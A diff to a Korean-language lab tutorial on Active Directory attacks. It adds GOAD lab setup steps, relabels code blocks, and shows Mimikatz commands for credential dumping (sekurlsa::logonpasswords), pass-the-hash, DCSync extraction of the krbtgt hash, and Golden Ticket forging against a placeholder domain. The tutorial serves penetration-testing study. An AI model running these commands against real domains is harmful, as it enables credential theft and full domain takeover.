@@ -44,10 +44,14 @@ sekurlsa::logonpasswords
 ```
 
 ### Active Directory 랩
-```powershell
-# DC + 도메인 조인된 클라이언트 구성
-# DCSync, Golden Ticket 실습 가능
-# https://github.com/Orange-Cyberdefense/GOAD (Game of AD)
+DCSync, Golden Ticket 등 도메인 수준의 공격을 실습하려면 도메인 컨트롤러(DC)와 도메인에 조인된 클라이언트 VM이 필요하다. 직접 AD DS를 설치해도 되지만, 아래와 같은 자동화 프로젝트를 활용하면 취약한 설정이 미리 구성된 환경을 빠르게 구축할 수 있다.
+
+```bash
+# GOAD (Game of Active Directory) - 취약한 AD 환경 자동 구축
+# DC 2대 + 도메인 조인 클라이언트 3대 구성, Kerberoasting/DCSync 등 실습 가능
+git clone https://github.com/Orange-Cyberdefense/GOAD.git
+cd GOAD
+# Vagrant + VirtualBox 또는 Proxmox 환경에서 실행
 ```
 
 ### 주의사항
@@ -61,26 +65,26 @@ sekurlsa::logonpasswords
 Mimikatz는 대화형 콘솔에서 명령어를 입력하는 방식으로 동작한다. 가장 먼저 디버그 권한을 획득해야 한다.
 
 ### 권한 상승
-```cm
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 ```
 
 ### 1. 평문 비밀번호 및 해시 추출
 현재 로그인된 사용자들의 인증 정보를 추출한다.
-```cmd
+```bash
 mimikatz # sekurlsa::logonpasswords
 ```
 
 ### 2. Pass-the-Hash
 비밀번호를 몰라도 NTLM 해시값만으로 인증을 우회하여 다른 시스템에 접근한다.
-```cmd
+```bash
 mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:<NTLM_HASH>
 ```
 
 ### 3. DCSync (도메인 컨트롤러 복제)
 도메인 관리자 권한이 있을 때, DC를 가장하여 모든 계정(krbtgt 포함)의 해시 정보를 동기화 요청으로 탈취한다.
-```cmd
+```bash
 mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt
 ```
 
@@ -91,7 +95,7 @@ mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt
 **Golden Ticket**은 도메인의 모든 서비스에 접근할 수 있는 만능 티켓(TGT)을 위조하는 공격이다. 이를 위해서는 `krbtgt` 계정의 해시가 필요하다.
 
 ### 티켓 생성
-```cmd
+```bash
 mimikatz # kerberos::golden /user:fakeadmin /domain:target.local /sid:<Domain_SID> /krbtgt:<KRBTGT_HASH> /ptt
 ```
 
